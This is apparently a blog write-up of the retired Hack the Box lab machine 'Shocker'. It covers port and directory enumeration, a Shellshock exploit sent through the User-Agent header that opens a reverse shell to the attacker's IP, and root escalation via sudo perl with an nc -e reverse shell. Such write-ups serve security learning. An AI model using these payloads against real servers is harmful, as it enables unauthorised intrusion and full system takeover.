---
layout: post
title: Hack the Box - Shocker
date: 2020-06-03 12:26:22 +0100
description: Shocker, while fairly simple overall, demonstrates the severity of the renowned Shellshock exploit, which affected millions of public-facing servers.
img: shocker.png
fig-caption: Shocker
categories: HackTheBox
tags: [Easy, Linux, Retired, CVE]
---
## Overview
Shocker, while fairly simple overall, demonstrates the severity of the renowned Shellshock exploit, which affected millions of public-facing servers.
## Enumeration
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/shocker]
└─$ sudo nmap -p- -T4 10.129.113.222          
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-15 15:46 GMT
Nmap scan report for 10.129.113.222
Host is up (0.017s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 12.10 seconds
```
When accessing the site only an image of a bug is displayed, through some guesswork with the name the shellshock exploit seems like a good candidate for the exploit. When enumerating the cgi-bin directory we find user.sh.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/shocker/shellshock-cgi]
└─$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.113.222/cgi-bin/FUZZ.sh                                          

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.113.222/cgi-bin/FUZZ.sh
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

user                    [Status: 200, Size: 119, Words: 19, Lines: 8]
```
## Foothold
Using burpsuites repeater we can send bash commands through the User-Agent header
```
User-Agent: () { :;}; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.27/4242 0>&1';
```
Then we should receive a shell
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/shocker/shellshock-cgi]
└─$ nc -nlvp 4242
listening on [any] 4242 ...
connect to [10.10.14.27] from (UNKNOWN) [10.129.113.222] 42300
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$
```
## Privilege Escalation
Privilege escalation is relatively simple using the command below we can see that the current user can run perl commands as root
```
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```
Using [GTFObins](https://gtfobins.github.io/gtfobins/perl/) we can find a command to run to return us a root shell, which we will need to modify however due to the limited terminal.
```
shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'exec "/tmp/nc -nv 10.10.14.27 4243 -e /bin/bash"'
```
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/shocker/shellshock-cgi]
└─$ nc -nlvp 4243
listening on [any] 4243 ...
connect to [10.10.14.27] from (UNKNOWN) [10.129.113.222] 37880
python3 -c "import pty; pty.spawn('/bin/bash')"
root@Shocker:/usr/lib/cgi-bin#
```
